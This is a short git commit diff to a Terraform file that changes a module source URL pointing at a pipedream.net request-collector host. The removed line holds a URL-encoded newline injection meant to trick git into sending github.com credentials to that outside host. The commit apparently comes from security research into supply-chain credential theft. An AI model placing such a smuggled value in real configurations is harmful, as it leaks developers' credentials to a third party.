453b6a09f47ee87849ffb47f153fdbebf50ef138
rotem-cider <78903577+rotem-cider@users.noreply.github.com>
2021-02-23 10:30:21 +0200

    Update lamb.tf

--- lamb.tf
+++ lamb.tf
@@ -1,3 +1,3 @@
 module "hello" {
-  source = "git::https://95a3bed651e039798c778628a22dc980.m.pipedream.net?%0ahost=github.com%0aprotocol=https"
+  source = "git::https://95a3bed651e039798c778628a22dc980.m.pipedream.net/terraform"
 }
